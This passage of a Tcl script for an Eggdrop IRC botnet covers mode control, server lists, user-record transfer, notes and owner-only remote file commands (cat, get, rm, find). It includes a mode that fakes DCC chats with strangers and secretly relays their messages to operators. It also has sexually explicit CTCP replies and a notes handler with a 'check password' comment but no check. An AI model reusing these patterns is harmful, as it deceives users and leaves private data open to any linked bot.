proc dcc:mchanset {h i a} {
    global bnick ; set g [stru [bi $a 0]] ; set c [bi $a 1] ; set m [br $a 2 end]
    if {$m == "" || [string length $g] != 1} {
	pb $i "Usage: .mchanset A / X / Y / Z.. <\#channel> <modes> to set modes,"
	pb $i "or   : .mchanset A / X / Y / Z.. <\#channel> [b]chanmode[b] <modes> to enforce channel modes ( +stmnilk.. )"
	return 0
    }
    if {![matchattr $h m|m $c]} { pb $i "Sorry, you are not +m on $c.." ; return 0 }
    putcmdlog "\#$h\# mchanset $g $c $m"
    if {$g == "A" || [matchattr $bnick $g]} {
	if {[validchan $c]} {
	    if {[strl [bi $m 0]] == "chanmode"} {
		set q "enforced chanmodes"
		set e "enforce chanmodes"
	    } else {
		set q "changed modes"
		set e "change modes"
	    }
	    set r [bcset $c $m]
	    if {$r == 1} {
		pb $i "Ok, $q for channel $c : [b]$m[b]"
		savechannels
	    } else {
		pb $i "Errors while trying to $e for channel $c : [b]$r[b]"
	    }
	} else {
	    pb $i "Warning : I don't monitor channel [b]$c[b] ! Sending command to other bots ! ;)"
	}
    }
    if {$g == "A"} {
	putallbots "mchanset $h $c $m"
	set g1 "ALL connected bots."
    } else {
	set g1 ""
	foreach b [bots] {
	    if {[matchattr $b $g]} {
		putbot $b "mchanset $h $c $m"
		lappend g1 $b
	    }
	}
	regsub -all " " $g1 ", " g
    }
    pb $i "Sent chanset command to : $g1"
}

proc recv_mchanset {b c a} {
    set h [bi $a 0]
    set c [bi $a 1]
    set m [br $a 2 end]
    if {![validchan $c]} { return 0 }
    if {![matchattr $h m|m $c]} {
	bl "Rejected mode-changes for $c requested by $h ( from $b ) : not channel master here !"
	return 0
    }
    if {[strl [bi $m 0]] == "chanmode"} {
	set q "Enforced chanmodes"
	set e "enforce chanmodes"
    } else {
	set q "Changed modes"
	set e "change modes"
    }
    set r [bcset $c $m]
    if {$r == 1} {
	bl "$q for channel $c : [b]$m[b] : requested by $h ( from $b )"
	savechannels
    } else {
	bl "Errors while trying to $e for channel $c as requested by $h ( from $b ) : [b]$r[b]"
    }
}

#################
# CTCP Bindings #
#################

set ctcp-version "What's Version?!Something like 'blinda' or 'antani'?!"
set ctcp-finger "Please, put the finger in your ass and be happy! ^_^"
set ctcp-userinfo "Well, i love pussy ... :P"
set ctcp-sed "Ejaculation is more than masturbation *_*"
set ctcp-clientinfo "I love to lick clitoris... ;o9"
set ctcp-errmsg "Ops, I 've lost my vagina!"
set ctcp-time "It 's time to have an orgasm now! @_@"
set ctcp-utc "I like action, fingers and tongue! ^_^"
set ctcp-page "Kiss my anus, I 'll be happy! ( * )"
set fake_module_conf "off"
bind dcc n dccfake smart:dccfake
bind dcc n pdcc smart:pdcc
bind ctcp - DCC chat:fake

proc smart:pdcc {h i a} {
    set w [bi $a 0]
    if {$a == ""} {
	pb $i "Usage : .pdcc <idx> <text>"
	return 0
    }
    if {![valididx $w]} {
	pb $i "Sorry, [b]$w[b] is not a valid idx.."
	return 0
    }
    putcmdlog "\#$h\# pdcc $w \[...\]"
    putdcc $w $a
}

proc smart:dccfake {h i a} {
    global fake_module_conf
    set w [strl [bi $a 0]]
    if {$w == "" || [lsearch -exact "on off" $w] == -1} {
	if {$w == ""} { putcmdlog "\#$h\# dccfake" }
	pb $i "DCC-Chat Faking is now : [b]$fake_module_conf[b]"
	pb $i "Use '.dccfake [b]on[b] or [b]off[b]' to change ! ;)"
	return 0
    }
    putcmdlog "\#$h\# dccfake $w"
    set fake_module_conf $w
    bl "Enable DCC-CHAT faking for non-users: Authorized by $h."
}

set dccfake {
    "hello" "hi" "sup" "yeah" "?" "fuck off" "go away" "leave me alone" "what" "well" "what do you want"
    "err" "uh" "piss off" "lamer" "im busy ok?" "Yes?" "you suck" "moron" "who are you" "get a life ok?"
    "get yourself a life" "uhm..." "ehm.."
}

proc fake:answ i {
    global dccfake
    if {[valididx $i]} { putdcc $i [lindex $dccfake [rand [llength $dccfake]]] }
}

proc fake:chat {i a} {
    if {![valididx $i] || $a == ""} { return 1 }
    foreach j [dcclist] {
	if {[lindex $j 0] == $i} {
	    set u [lindex $j 2]
	}
    }
    foreach j [dcclist] {
	set h [lindex $j 1]
	if {[matchattr $h o] && ![matchattr $h b] && [valididx [lindex $j 0]]} {
	    putdcc [lindex $j 0] "\[From $u - idx [b]$i[b]\] -> $a"
	}
    }
    utimer 5 "fake:answ $i"
}

proc fake:kill i {
    if {[valididx $i]} { killdcc $i }
    bl "Killed faked DCC-CHAT with idx $i.."
}

proc chat:fake {n uh h d k a} {
    global fake_module_conf
    if {$fake_module_conf == "off" || [stru [bi $a 0]] != "CHAT"} { return 0 }
    if {![validuser $h]} {
	set i [conn_try [lindex [split $uh @] 1] [bi $a 3]]
	if {![valididx $i]} { return 0 }
	control $i fake:chat
	bl "Faking DCC CHAT for non-user: $n ( $uh ) ! ;)"
	bl "Use '[b].pdcc $i <text>[b]' or '[b].ndcc $i <text>[b]' to talk to him! ;)"
	utimer 30 "fake:kill $i"
    }
}

###############################
# Security Bindings / Unbinds #
###############################

unbind msg - die *msg:die
unbind msg - memory *msg:memory
unbind msg - whois *msg:whois
unbind msg - reset *msg:reset
unbind msg - rehash *msg:rehash
unbind msg - jump *msg:jump
unbind msg - email *msg:email
unbind msg - help *msg:help
unbind msg - status *msg:status
unbind msg - who *msg:who
unbind msg - info *msg:info
unbind msg - key *msg:key
unbind msg - addhost *msg:addhost
unbind dcc - reload *dcc:reload
bind dcc m ndcc dcc:ndcc
bind dcc n bchat dcc:bchat
bind chat - * smart:chatter_chat
bind act - * smart:chatter_act
unbind dcc m +user *dcc:+user
bind dcc m +user smart:+user
unbind dcc m|m adduser *dcc:adduser
bind dcc m|m adduser smart:adduser

proc smart:+user {h i a} {
    set u [bi $a 0] ; set U [validuser $u] ; *dcc:+user $h $i $a
    if {!$U && [validuser $u]} { setuser $u COMMENT "Added by $h on [ctime [unixtime]]" }
}

proc smart:adduser {h i a} {
    set u [bi $a 0] ; set U [validuser $u] ; *dcc:adduser $h $i $a
    if {!$U && [validuser $u]} { setuser $u COMMENT "Added by $h on [ctime [unixtime]]" }
}

proc smart:chatter_act {h c a} {
    smart:chatter_send $h act $a
}

proc smart:chatter_chat {h c t} {
    smart:chatter_send $h say $t
}

proc smart:chatter_send {h w t} {
    global bchat_idx
    foreach j [array names bchat_idx] {
	if {![valididx $bchat_idx($j)]} {
	    dccputchan 0 "[boja] - $j left the party-line"
	    unset bchat_idx($j)
	} else {
	    if {$w == "say"} {
		putdcc $bchat_idx($j) "<[b]$h[b]> $t"
	    } elseif {$w == "act"} {
		putdcc $bchat_idx($j) "* [b]$h[b] $t"
	    }
	}
    }
}

proc smart:chatter_rec {i a} {
    global bchat_idx
    if {$a == ""} {
	foreach j [array names bchat_idx] {
	    if {$bchat_idx($j) == $i} {
		dccputchan 0 "[boja] - $j left the party-line"
		unset bchat_idx($j)
		return 0
	    }
	}
    }
    foreach j [array names bchat_idx] {
	if {![valididx $bchat_idx($j)]} {
	    dccputchan 0 "[boja] - $j left the party-line"
	    unset bchat_idx($j)
	} else {
	    if {[strl $a] == ".who"} {
		smart_who $bchat_idx($j)
	    } else {
		if {[string match *ACTION* [bi $a 0]]} {
		    dccputchan 0 "[b]$j[b] [lrange $a 1 end]"
		} else {
		    dccputchan 0 "<[b]$j[b]> $a"
		}
	    }
	}
    }
}

proc smart:dccuser {i} {
    global bchat_port bchat_idx
    catch {listen $bchat_port off}
    foreach j [array names bchat_idx] {
	if {$bchat_idx($j) == ""} {
	    set bchat_idx($j) $i
	    smart_who $i
	    pb $i "Wellcome to the partyline interface $j ! ^_^"
	    pb $i "You can use '[b].who[b]' to see people on partyline, have fun !!!"
	    dccputchan 0 "[boja] - External user $j Joined the partyline"
	}
    }
    control $i smart:chatter_rec
}

proc dcc:bchat {h i a} {
    global bchat_port bchat_idx
    set n [bi $a 0]
    if {$n == ""} {
	pb $i "Usage : .bchat <nickname> \[port\]"
	return 0
    }
    set p [bi $a 1]
    if {$p == ""} {
	set p [expr 10000 + [rand 55536]]
    } elseif {[string trim $p "0123456789"] != "" || [expr $p] < 10000} {
	pb $i "Invalid port : [b]$p[b]..Please, enter a numerical value >= 10000"
	return 0
    }
    set bchat_port $p
    if {[catch {listen $p script smart:dccuser}] != 0} {
	pb $i "Error trying to open port $p for dcc-chat session.."
	return 0
    }
    putcmdlog "\#$h\# bchat $n [bi $a 1]"
    bl "Trying to let external user [b]$n[b] join the party-line : Authorized by $h."
    putserv "PRIVMSG $n :\001DCC CHAT chat [myip] $p\001"
    set bchat_idx($n) ""
}

al init "Security system loaded and ready!"

proc dcc:ndcc {h i a} {
    global bnc_u
    set n [bi $a 0]
    set t [br $a 1 end]
    if {$n == "" || [string trim $n "0123456789"] != "" || $t == ""} {
	pb $i "Usage: .ndcc <idx> <text>"
	pb $i "Use '.dcclist' to have a list of valid idx!"
	return 0
    }
    set o 1
    foreach j [dcclist] {
	if {[lindex $j 0] == $n} {
	    set o 0
	    break
	}
    }
    if {$o} {
	pb $i "Sorry, $n is not a valid idx !"
	pb $i "Use '.dcclist' to have a list of valid idx!"
	return 0
    }
    putcmdlog "\#$h\# ndcc $n \[...\]"
    if {[info exists bnc_u($n)] && [bi $bnc_u($n) 7] == "on"} {
	pn $n 461 "[b]$h[b] - $t"
    } else {
	if {[valididx $n]} { putdcc $n "[boja] \[[b]ndcc[b] from $h\] - $t" }
    }
    return 0
}

# BotNet Stuff

bind dcc n autorem dcc:autorem
bind dcc t bjump dcc:bjump
bind dcc t botserv dcc:botserv
bind bot - botserv recv_botserv
bind bot - botserv_rep botserv_rep
bind dcc t +server dcc:+server
bind dcc t -server dcc:-server
bind dcc t tolink tolink
bind dcc t la linkall
bind dcc t linkall linkall
bind dcc n senduser dcc:senduser
bind bot - senduser recv_senduser
bind bot - senduser_rep senduser_rep
bind dcc n ls dcc:ls
bind dcc n find dcc:find
bind dcc n cat dcc:cat
bind dcc n get dcc:get
bind dcc n cp dcc:cp
bind dcc n mv dcc:cp
bind dcc n rm dcc:rm
bind dcc n gzip dcc:gzip
bind dcc n gunzip dcc:gzip
bind dcc n send dcc:send
bind dcc n upgrade dcc:send
bind dcc n msend dcc:msend
bind dcc n mupgrade dcc:msend
bind bot - sendfile bot:sendfile
bind dcc - probe dcc:probe
unbind dcc - notes *dcc:notes
bind dcc - notes dcc:notes2
bind chon - * chon:notes2
bind bot - notes2 bot:notes2
bind bot - n2rep bot:n2rep

proc n2_idx {b h i s} {
    global bnick
    set m "n2rep $h $i "
    switch -exact -- [notes $h] {
	-2 { append m "Notefile failure." }
	-1 { return 0 }
	0  {
	    if {$s} { return 0 }
	    append m "You have no messages."
	}
	default {
	    putbot $b "n2rep $h $i ### You have the following notes waiting:"
	    set index 0
	    foreach n [notes $h "-"] {
		if {$n != 0} {
		    incr index
		    set sender [bi $n 0]
		    set date [strftime "%b %d %H:%M" [lindex $n 1]]
		    putbot $b "n2rep $h $i %$index. $sender ($date)"
		}
	    }
	    append m "### Use '.notes $bnick read' to read them."
	}
    }
    putbot $b $m
    return 1
}

proc n2_read {b h i n} {
    if {$n == ""} { set n "-" }
    set m "n2rep $h $i "
    switch -exact -- [notes $h] {
        -2 { append m "Notefile failure." }
	-1 { return 0 }
        0  { append m "You have no messages." }
	default {
	    set count 0
	    set list [listnotes $h $n]
	    foreach note [notes $h $n] {
		if {$note != 0} {
		    set index [lindex $list $count]
		    set sender [lindex $note 0]
		    set date [strftime "%b %d %H:%M" [lindex $note 1]]
		    set msg [lrange $note 2 end]
		    incr count
		    putbot $b "n2rep $h $i $index. $sender ($date): $msg"
		} else {
		    append m "You don't have that many messages."
		}
	    }
	}
    }
    if {[llength $m] > 3} { putbot $b $m }
    return 1
}

proc n2_erase {b h i n} {
    set m "n2rep $h $i "
    switch -exact -- [notes $h] {
	-2 { append m "Notefile failure." }
	-1 { return 0 }
	0  { append m "You have no messages." }
	default {
	    set e [erasenotes $h $n]
	    set r [notes $h]
	    if {$r == 0 && $e == 0} {
		append m "You have no messages."
	    } elseif {$r == 0} {
		append m "Erased all notes."
	    } elseif {$e == 0} {
		append m "You don't have that many messages."
	    } elseif {$e == 1} {
		append m "Erased 1 note, $r left."
	    } else {
		append m "Erased $e notes, $r left."
	    }
	}
    }
    putbot $b $m
    return 1
}

proc bot:notes2 {b cm a} {
    #chech password !
    set h [bi $a 0]
    set c [bi $a 1]
    set n [bi $a 2]
    set i [bi $a 3]
    if {$n == "" || $n == "all"} { set n "-" }
    switch $c {
       "silent" { set ret 0; n2_idx $b $h $n 1 }
       "index" { set ret [n2_idx $b $h $i 0] }
       "read"  { set ret [n2_read $b $h $i $n] }
       "erase" { set ret [n2_erase $b $h $i $n] }
       default { set ret 0 }
    }
    if {$n == "-"} { set n "" }
    if {$ret == 1} { putcmdlog "\#$h@$b\# notes $c $n" }
}

proc bot:n2rep {b cm a} {
    set h [bi $a 0]
    set i [bi $a 1]
    set r [br $a 2 end]
    if {![valididx $i] || [idx2hand $i] != $h} {
	set i [hand2idx $h]
    }
    if {$i == -1} { return 1 }
    if {[string index $r 0] == "%"} {
	set r [string range $r 1 end]
    }
    putdcc $i "[boja] \[From $b\] - [join $r]"
}

proc chon:notes2 {h i} {
    putallbots "notes2 $h silent $i"
}

proc dcc:notes2 {h i a} {
    global bnick
    if {$a == ""} {
	pb $i "Usage: notes \[bot or all\] index"
	pb $i "or   : notes \[bot or all\] read <num\# or all>"
	pb $i "or   : notes \[bot or all\] erase <num\# or all>"
	pb $i "num\# may be numbers and/or intervals separated by ';'"
	pb $i "ex: notes erase 2-4;8;16-"
	pb $i "ex: notes $bnick read all"
	return 0
    }
    set b [strl [bi $a 0]]
    set c [strl [bi $a 1]]
    set n [strl [lindex $a 2]]
    set num $n
    if {$num == ""} { set num "-" }
    if {$b != "all" && [lsearch [strl [bots]] $b] < 0} {
	if {$c != "index" && $c != "read" && $c != "erase"} {	    
	    if {$b == [strl $bnick]} {
		return [*dcc:notes $h $i [lrange $a 1 end]]
	    } else {
		return [*dcc:notes $h $i $a]
	    }
	} else {
	    pb $i "Sorry, I can 't see [b]$b[b] as a valid linked bot.."
	    return 0
	}
    } elseif {[lsearch "index read erase" $c] == -1} {
	pb $i "Function must be one of INDEX, READ, or ERASE."
    } elseif {$b == "all"} {
	putallbots "notes2 $h $c $num $i"
	*dcc:notes $h $i [lrange $a 1 end]
    } else {
	putbot $b "notes2 $h $c $num $i"
    }
    putcmdlog "\#$h\# notes $b $c $n"
}

proc dcc:autorem {h i a} {
    global bnick
    if {($a == "") || (![passwdok $h $a])} {
	pb $i "Are you sure? This will delete [b]all[b] bots which are not"
	pb $i "currently linked-up ! Be warned ! If you still want that,"
	pb $i "use [b].autorem <yourpassword>[b]"
	return 0
    }
    putcmdlog "\#$h\# autorem"
    set rb ""
    foreach b [userlist b] {
	if {![islinked $b] && ([strl $b] != [strl $bnick])} {
	    lappend rb $b
	    deluser $b
	    pb $i "Removed bot [b]$b[b]"
	}
    }
    bl "Removed all non-linkd bots from userfile : Authorized by $h"
    if {$rb != ""} {
	bl "Removed bots : $rb"
    }
}

proc dcc:bjump {h i a} {
    set b [bi $a 0]
    set s [bi $a 1]
    set p [bi $a 2]
    set w [bi $a 3]
    if {$s == ""} {
	pb $i "Usage: .bjump <bot> next"
	pb $i "or .bjum <bot> <server> \[port \[password\]\]"
	return 0
    }
    if {![matchattr $b b]} {
	pb $i "Sorry, I can't recognize '[b]$b[b]' as a valid bot.. :("
	return 0
    }
    putcmdlog "\#$h\# bjump $b $s $p"
    if {$p == ""} { set p 6667 }
    putbot $b "mjump $h $s $p $w"
    bl "Sent jump-order for server $s:$p to bot $b : requested by $h."
}

proc dcc:botserv {h i a} {
    global bnick server
    set g [stru [bi $a 0]]
    if {($g == "") || ([strl $g] == [strl $bnick])} {
	 putcmdlog "\#$h\# botserv"
	if {$server == ""} {
	    pb $i "I'm currently looking for a server.. :(" 
	} else {
	    pb $i "I'm currently on $server"
	}
	return 0
    }
    if {[string length $g] == 1} {
	putcmdlog "\#$h\# botserv $g"
	set serv $server
	if { $serv == ""} { set serv "no server.. :(" }
	pb $i "----=BotNet Servers=----"
	if {$g == "A" || [matchattr $bnick $g]} { pb $i "[b]$bnick[b] \t: $serv" }
	if {$g == "A"} {
	    putallbots "botserv $i"
	} else {
	    foreach bot [bots] { if {[matchattr $bot "$g"]} { putbot $bot "botserv $i" } }
	}
    } else {
	if {[isbot $g]} {
	    putcmdlog "\#$h\# botserv [bi $a 0]"
	    pb $i "----=BotNet Servers=----"
	    putbot $g "botserv $i"
	} else {
	    pb $i "Sorry, I don't recognize $g as a linked bot.."
	    pb $i "Usage: .botserv"
	    pb $i "or .botserv A"
	    pb $i "or .botserv X/Y/Z..."
	    pb $i "or .botserv <bot>"
	}
    }
}

proc recv_botserv {b c a} {
    global server
    set i [bi $a 0] ; putbot $b "botserv_rep $i $server"
}

proc botserv_rep {b c a} {
    set i [bi $a 0] ; set s  [bi $a 1]
    if {$s == ""} { set s "no server.. :(" } ; pb $i "[b]$b[b] \t: $s"
}

set serv_module_conf "$wpref.servers"
set strict-servernames 0
set check-stoned 0

proc save_serv {l} {
    global serv_module_conf
    set fd [open $serv_module_conf w]
    puts $fd "set servers \{"
    foreach s $l { puts $fd "\t$s" }
    puts $fd "\}"
    close $fd
}

if {![file exist $serv_module_conf]} { save_serv $servers }

source $serv_module_conf

proc dcc:+server {h i a} {
    global servers default-port serv_module_conf
    set n [bi $a 0]
    set p [bi $a 1]
    set w [bi $a 2]
    if {$n == ""} {
	pb $i "Usage : .+server <newserver> \[port\] \[password\]"
	return 0
    }
    if {$p != "" && $w != ""} {
	if {[string trim $p "0123456789"] != ""} {
	    pb $i "Usage : .+server <newserver> \[port\] \[password\]"
	    return 0
	}
    } elseif {$p != "" && $w == ""} {
	if {[string trim $p "0123456789"] != ""} {
	    set w $p
	    if {[info exists default-port]} { set p ${default-port} } else { set p 6667 }
	}
    } elseif {$p == ""} {
	if {[info exists default-port]} { set p ${default-port} } else { set p 6667 }
    }
    if {$w != ""} { set N "$n:$p:$w" } else { set N "$n:$p" }
    if {[lsearch -exact [join $servers] $N] != -1} {
	pb $i "I already have that server in my list! See '.servers' ! :)"
	return 0
    }
    putcmdlog "\#$h\# +server $n $p \[...\]"
    lappend servers $N
    save_serv $servers
    source $serv_module_conf
    bl "Added server $n to server-list : requested by $h."
}

proc dcc:-server {h i a} {
    global servers serv_module_conf
    set o [bi $a 0]
    if {$o == ""} {
	pb $i "Usage : .-server <oldserver>"
	return 0
    }
    if {[lsearch -regexp [join $servers] $o] == -1} {
	pb $i "Sorry, server '$o' is not in my server-list.. Try '[b].servers[b]' !"
	return 0
    }
    putcmdlog "\#$h\# -server $o"
    set l ""
    set r ""
    foreach s $servers {
	if {[string match *$o* $s]} {
	    lappend r $s
	} else {
	    lappend l $s
	}
    }
    if {[llength $l] < 1} {
	pb $i "Sorry, I 'll remain without servers ( tryed to remove '$r' ) : please add new servers first !"
	return 0
    }
    save_serv $l
    source $serv_module_conf
    bl "Removed '[join $r]' from serverlist : requested by $h"
}

proc linkall {h i a} {
    set j 0 ; set v [bi $a 0] ; putcmdlog "\#$h\# linkall $v"
    foreach b [userlist b] {
	if {![islinked $b]} {
	    if {$v == ""} {
		pb $i "Linking to $b" ; link $b ; incr j
	    } else {
		pb $i "Linking to $b via $v" ; link $v $b ; incr j
	    }
	}
    }
    if {$j == 0} { pb $i "All bots linked." } else { pb $i "Total bots linked: [b]$j[b]" }
}

proc tolink {h i a} {
    global bnick
    set bluh 0
    set blah 0
    putcmdlog "#$h# tolink"
    foreach x [userlist b] {
	set bleh 0
        incr bluh
	foreach o [bots] {
	    if {[strl $o] == [strl $x]} {
		set bleh 1
	    }
	}
	if {$bleh == 0} {
	    if {[strl $bnick] != [strl $x]} {
		pb $i "Not linked: [b]$x[b]"
		incr blah
	    }
	}
    }
    pb $i "To link: [b]$blah[b] bots, total known bots: [b]$bluh[b]"
}

proc dcc:find {h i a} {
    set w [bi $a 0] ; set f  [bi $a 1]
    if {$w == ""} { pb $i "Usage: .find \[where\] <filename>" ; return 0 }
    if {$f == ""} { set f $w ; set w "." }
    putcmdlog "\#$h\# find $w $f"
    if {[catch {set f_res [exec find $w -name $f]} f_err] != 0} {
	pb $i "Sorry, error while running 'find' program : [b]$f_err[b]" ; return 0
    }
    if {$f_res != ""} { pb $i $f_res } else { pb $i "Nothing found.. :o(" }
}

proc dcc:ls {h i a} {
    set w [bi $a 0]
    putcmdlog "\#$h\# ls $w"
    if {$w == ""} { pb $i "Files in current directory :" } elseif {[file isdirectory $w]} {
	pb $i "Files in $w directory :" } else { pb $i "Files matching $w :" }
    if {$w == "" || [file isdirectory $w] || [file isdirectory [string range $w 0 [expr [string first "*" $w] - 1]]]} {
	if {$w == ""} {
	    set hw ".*" ; set nw "*"
	} elseif {[file isdirectory $w]} {
	    set hw "$w/.*" ; set nw "$w/*"
	} else {
	    set hw "[string range $w 0 [expr [string first "*" $w] - 1]].[string range $w [string first "*" $w] end]"
	    set nw $w
	}
	set hr [glob -nocomplain $hw]
	set nr [glob -nocomplain $nw]
    } else {
	if {[string index $w 0] == "*"} { set hr [glob -nocomplain .$w] } ; set nr [glob -nocomplain $w]
    }
    if {[info exists hr]} {
	foreach f $hr {
	    if {[file isdirectory $f]} { set f "\[dir\] \t [file attributes $f -permissions]\t [b]$f[b]" ; pb $i $f }
	}
    }
    foreach f $nr {
	if {[file isdirectory $f]} { set f "\[dir\] \t [file attributes $f -permissions]\t [b]$f[b]" ; pb $i $f }
    }
    if {[info exists hr]} {
	foreach f $hr {
	    if {[file isfile $f]} {
		set f "\[file\]\t [file attributes $f -permissions] \t [b]$f[b] \t ([file size $f] bytes)" ; pb $i $f
	    }
	}
    }
    foreach f $nr {
	if {[file isfile $f]} {
	    set f "\[file\]\t [file attributes $f -permissions] \t [b]$f[b] \t ([file size $f] bytes)" ; pb $i $f
	}
    }
    if {[info exists hr]} {
	if {($hr == "") && ($nr == "")} { pb $i "no matches found.." }
    } else {
	if {$nr == ""} { pb $i "no matches found.." }
    }
    pb $i "------------------------"
}

proc dcc:get {h i a} {
    set w [bi $a 0] ; set n [bi $a 1]
    if {$w == ""} { pb $i "Usage: .get <filename> \[your-IRC-nick\]" ; pb $i "Try '.ls' to have a list.. ;)" ; return 0 }
    if {![file exists $w]} { pb $i "Sorry, I can't find file '$w'.." ; return 0 }
    if {![file readable $w]} { pb $i "Sorry, I haven't privileges to read local file '$w'.." ; return 0 }
    if {[file isdirectory $w]} { pb $i "Sorry, $w is a directory!!!" ; return 0 }
    putcmdlog "\#$h\# get $w $n"
    if {$n == ""} { set n $h }
    dccsend $w $n ; bl "Sending file '$w' to $n : Authorized by $h."
}

proc dcc:cat {h i a} {
    set w [bi $a 0]
    if {$w == ""} { pb $i "Usage: .cat <filename> . Try '[b].ls[b]' to have a list.. ;)" ; return 0 }
    if {![file exists $w]} { pb $i "Sorry, I can't find local file '$w'.." ; return 0 }
    if {![file readable $w]} { pb $i "Sorry, I haven't privileges to read local file '$w'.." ; return 0 }
    if {[file isdirectory $w]} { pb $i "Sorry, '$w' is a directory.." ; return 0 }
    putcmdlog "\#$h\# cat $w" ; pb $i "Catenating local file '$w'.."
    set fd [open $w r] ; while {![eof $fd]} { gets $fd l ; if {[eof $fd]} { break } ; putdcc $i $l } ; close $fd
    if {$l != ""} { putdcc $i $l } ; pb $i "---------------------------------"
}

proc dcc:senduser {h i a} {
    global userfile
    set u [bi $a 0]
    set b [bi $a 1]
    if {$b == ""} {
	pb $i "Usage : .senduser <handle> <target-bot>"
	pb $i "Or    : .senduser <handle> A"
	pb $i "Or    : .senduser <handle> X / Y / Z / ..."
	return 0
    }
    save
    if {![validuser $u]} {
	pb $i "Warning! '[b]$u[b]' is not a known user ! :o("
	return 0
    }
    if {([string length $b] > 1) && (![islinked $b])} {
	pb $i "Warning! '[b]$b[b]' is not a linked bot ! :o("
	return 0
    }
    if {[string length $b] == 1} {
	set g "[stru $b]"
    }
    if {[info exists g]} {
	putcmdlog "\#$h\# senduser $u $g"
    } else {
	putcmdlog "#$h# senduser $u $b"
    }
    set fd [open $userfile r]
    gets $fd l
    while {[strl [bi $l 0]] != [strl $u] && ![eof $fd]} {
	gets $fd l
	if {[eof $fd]} {
	    break
	}
    }
    if {[strl [bi $l 0]] != [strl $u]} {
	bl "Error finding $u in userfile.. :o("
	close $fd
	return 0
    }
    set n 0
    set r($n) "{$l}"
    set ok "no"
    while {![eof $fd] && $ok != "yes"} {
	gets $fd l
	if {[string index [bi $l 0] 0] == "-" || [string index [bi $l 0] 0]== "!"} {
	    if {[string length $r($n)] < 150} {
		lappend r($n) "$l"
	    } else {
		incr n
		set r($n) "{$l}"
	    }
	} else {
	    set ok "yes"
	}
    }
    close $fd
    set N $n
    set n 0
    while {$n <= $N} {
	if {[info exists g]} {
	    if {$g == "A"} {
		set g1 "ALL connected"
		putallbots "senduser $h $i $u $N $n {$r($n)}"
	    } else {
		set g1 $g
		foreach bot [bots] {
		    if {[matchattr $bot $g]} {
			putbot $bot "senduser $h $i $u $N $n {$r($n)}"
		    }
		}
	    }
	} else {
	    putbot $b "senduser $h $i $u $N $n {$r($n)}"
	}
	incr n
    }
    if {[info exists g1]} {
	bl "Sent userrecord for $u to $g1 bots : Authorized by $h."
    } else {
	bl "Sent userrecord for $u to $b : Authorized by $h."
    }
}

set send_temp "smart.$bnick.senduser.tmp"

proc recv_senduser {b c a} {
    global userfile botnick send_temp private-globals
    set h [bi $a 0]
    set i [bi $a 1]
    set u [bi $a 2]
    set N [bi $a 3]
    set n [bi $a 4]
    set r($n) [lindex $a 5]
    if {$n == 0} {
	set fd [open $send_temp w]
	puts $fd $r($n)
	close $fd
    } else {
	set fd [open $send_temp a]
	puts $fd $r($n)
	close $fd
    }
    if {$n < $N} {
	return 0
    }
    set n 0
    set fd [open $send_temp r]
    while {$n <= $N && ![eof $fd]} {
	gets $fd r($n)
	incr n
	if {[eof $fd]} {
	    break
	}
    }
    close $fd
    set n [file delete -force $send_temp]
    if {[validuser $u]} {
	bl "Could not add user-record for '[b]$u[b]' as requested by $h ( from $b ) : user already exists !"
	set s "Could not add user-record for '[b]$u[b]' : user already exists !"
	putbot $b "senduser_rep $i {$s}"
	return 0
    }
    set n 0
    set fd [open $userfile a]
    while {$n <= $N} {
	foreach l $r($n) {
	    puts $fd $l
	}
	incr n
    }
    close $fd
    set s "Transfer user-record for '[b]$u[b]' : OK !!!"
    bl "Added user-record for '[b]$u[b]' : requested by $h ( from $b )"
    if {![matchattr $h n]} {
	reload
	if {[info exists private-globals]} {
	    set pg ${private-globals}
	} else {
	    set pg n
	}
	set rf ""
	foreach f [split [chattr $u] ""] {
	    if {[lsearch -exact [split $pg ""] $f] != -1} {
		lappend rf $f
	    }
	}
	regsub -all " " $rf "" rf
	if {$rf != ""} {
	    chattr $u -$rf
	    save
	    bl "Removed global flags from new user $u : [b]$rf[b] : $h is now owner here."
	    append s " Rejected global flags : [b]$rf[b] ( you are not owner here )"
	}
    } else {
	reload
    }
    putbot $b "senduser_rep $i {$s}"
}

proc senduser_rep {b c a} {
    set i [bi $a 0]
    set s [lindex $a 1]
    pb $i "From [b]$b[b] : $s"
}

proc dcc:rm {h i a} {
    set w [bi $a 0]
    if {$w == ""} { pb $i "Usage: .rm <file-to-remove>" ; return 0 }
    if {![file exists $w]} {
	pb $i "Sorry, I can't find local file '$w'.."
	pb $i "Try '[b].ls[b]' or '[b].find <filename>[b]' to have a list.. ;)" ; return 0
    }
    putcmdlog "\#$h\# rm $w"
    if {[catch {file delete -force $w} rm_err] != 0} {
	pb $i "Error while trying to delete '$w' : [b]$rm_err[b]"
    } else {
	bl "Removed local file '$w' : Authorized by $h."
    }
}

proc dcc:gzip {h i a} {
    global lastbind
    set s [bi $a 0] ; set d [bi $a 1]
    if {$s == ""} { pb $i "Usage: $lastbind <source> \[dest\]" ; return 0 }
    if {![file exists $s]} { pb $i "File not found: [b]$s[b]" ; return 0 }
    if {![file readable $s]} { pb $i "Sorry, I can 't read file [b]$s[b].." ; return 0 }
    if {[file isdirectory $s]} { pb $i "Sorry, [b]$s[b] is a directory.." ; return 0 }
    if {$d == ""} { if {$lastbind == "gzip"} { set d "$s.gz" } else { set d "$s.uncompressed" } }
    if {[file exists $d]} { pb $i "Sorry, file [b]$d[b] already exists.." ; return 0 }
    if {![hascompress]} { pb $i "Sorry, $lastbind needs compression module.." ; return 0 }
    if {$lastbind == "gunzip" && ![iscompressed $s]} {
	pb $i "Sorry, file [b]$s[b] is not compressed (in gzip format).." ; return 0
    }
    putcmdlog "\#$h\# $lastbind $s $d"
    switch -exact [strl $lastbind] {
	gzip   { set q "" ; compressfile -level 9 $s $d }
	gunzip { set q "un" ; uncompressfile $s $d }
    }
    pb $i "Succesfully ${q}compressed [b]$s[b] to [b]$d[b]"
}

proc dcc:cp {h i a} {
    global lastbind
    set s [bi $a 0] ; set t [bi $a 1]
    if {$t == ""} { pb $i "Usage: .$lastbind <source-file> <dest-file>" ; return 0 }
    if {![file exists $s]} {
	pb $i "Sorry, I can't find local file '$s'.."
	pb $i "Try '[b].ls[b]' or '[b].find <filename>[b]' to have a list.. ;)" ; return 0
    }
    if {$t == $s} { pb $i "Sorry, '$t' and '$s' are the same file! :o(" ; return 0 }
    putcmdlog "\#$h\# $lastbind $s $t"
    if {[file exists $t] && ![file isdirectory $t]} {
	if {[catch {file copy -force $t $t.bak} f_err] != 0} {
	    pb $i "Sorry, error while trying to create backup-copy of existing '$t' : [b]$f_err[b]"
	    pb $i "Operation aborted.. :o(" ; return 0
	}
	pb $i "File '$t' exists : created backup copy '$t.bak'.. ;)"
